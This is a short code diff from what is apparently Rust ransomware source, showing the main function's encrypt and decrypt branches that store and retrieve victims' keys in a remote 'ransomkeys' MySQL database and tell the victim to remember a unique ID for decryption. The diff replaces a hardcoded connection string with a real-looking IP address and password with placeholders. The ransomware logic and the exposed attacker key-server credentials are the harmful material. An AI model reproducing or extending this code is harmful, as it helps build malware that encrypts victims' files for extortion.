@@ -63,7 +63,7 @@ fn main() -> Result<(), Box<dyn Error>> {
     let path = &args[2].trim_end();
     let args1 = args[1].trim_end();
     if args1 == "encrypt" {
-        let url = "mysql://deja:dejasransompassword@138.2.134.240/ransomkeys";
+        let url = "mysql://user:password@dbip/ransomkeys";
         let pool = Arc::new(Pool::new(url).unwrap());
         let mut conn = pool.get_conn().unwrap();
         println!("REMEMBER THE FOLLOWING UNIQUE ID FOR DECRYPTION!");
@@ -89,7 +89,7 @@ fn main() -> Result<(), Box<dyn Error>> {
         }
     }
     if args1 == "decrypt" {
-        let url = "mysql://deja:dejasransompassword@138.2.134.240/ransomkeys";
+        let url = "mysql://user:password@dbip/ransomkeys";
         let pool = Arc::new(Pool::new(url).unwrap());
         let mut conn = pool.get_conn().unwrap();
         let mut randomuuid = String::new();
